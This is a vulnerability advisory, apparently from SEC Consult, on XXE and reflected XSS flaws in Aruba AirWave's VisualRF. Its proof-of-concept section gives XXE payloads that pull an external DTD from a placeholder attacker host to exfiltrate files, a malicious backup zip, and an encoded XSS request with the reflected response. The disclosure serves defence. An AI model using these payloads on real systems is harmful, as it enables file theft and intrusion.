Business recommendation:
------------------------
SEC Consult recommends not to use the product in a production environment
until a thorough security review has been performed by security professionals
and all identified issues have been resolved.


Vulnerability overview/description:
-----------------------------------
1) XML External Entity Injection (CVE-2016-8526)
The used XML parser is resolving external XML entities which allows attackers
to read files and send requests to systems on the internal network (e.g port
scanning).

The vulnerability can be exploited by a low privileged read-only user
to read sensitive information / files with malicious XML code.
Note that as Aruba's passwords are encrypted with a shared static key,
privilege escalation to admin role is also possible!

Multiple different functions are affected by XXE.

According to the vendor another researcher has also found one of the XXE issues, hence
credits go to them as well.
Vendor: "Although the team hasn't reproduced this yet, Iâ€™ve had other reports
come in through our bug bounty program last month about XXE issues in VisualRF.
One of the issues you reported is the same, and you reported three others that we
haven't seen yet."


2) Reflected Cross Site Scripting (CVE-2016-8527)
Due to the lack of input validation, an attacker can insert malicious JavaScript
code to be executed under a victim's browser context.


Proof of concept:
-----------------
1) XML External Entity Injection (CVE-2016-8526)
a) XXE in VisualRF Backup Sites

Login as any user role (including read-only/standard user)
Navigate to VisualRF > Floor Plans > Select 'View' under 'Network' section.
Select a campus (e.g. Default Campus) > Select 'Edit' >
Select action 'Export Floor Plans' > Ok

POST /visualrf/backup_sites HTTP/1.1
Host: <AirWaveHost>
[...]

b) XXE in Visual RF Site Restore
$ cat version.xml
   <?xml version="1.0" encoding="UTF-8" standalone="no"?>
   <!DOCTYPE x [<!ENTITY % foo SYSTEM "http://<AttackerHost>:1234/version.dtd">%foo;%param1;]>
   &exfil;<backup backup-time="Mon Nov 21 14:44:41 CET 2016" build="${svn.build}" plan-mode="false" version="8.0.0"/>

$ zip backup_sectest.zip version.xml
  adding: version.xml (deflated 16%)

And then just upload the backup_sectest.zip via the restore functionality.

POST /nf/visualrf_siterestore HTTP/1.1
Host: <AirWaveHost>
[...]

c) XXE in Visual RF Verify
POST /visualrf/verify/<Site-ID> HTTP/1.1
Host: <AirWaveHost>
[...]

<?xml version="1.0" encoding="UTF-8" ?><!DOCTYPE x [<!ENTITY % foo SYSTEM "http://<AttackerHost>:1234/sectest.dtd">%foo;%param1;]><visualrf:sites xmlns:visualrf="http://www.airwave.com/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" version="1"><site

/>&exfil;</site></visualrf:sites>


2) Reflected Cross Site Scripting (CVE-2016-8527)
Note that the XSS payload can be used with either HTTP parameter 'start' or 'end'.

GET /visualrf/group_list.xml?aps=1&start=%3ca%20xmlns%3aa%3d'http%3a%2f%2fwww.w3.org%2f1999%2fxhtml'%3e%3ca%3abody%20onload%3d'alert(/XSS/)'%2f%3e%3c%2fa%3e&end=500&match HTTP/1.1
Host: <AirWaveHost>

[...]
HTTP/1.1 200 OK
[...]

<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
<results>
  <error>For input string: "<a xmlns:a='http://www.w3.org/1999/xhtml'><a:body onload='alert(/XSS/)'/></a>"</error>
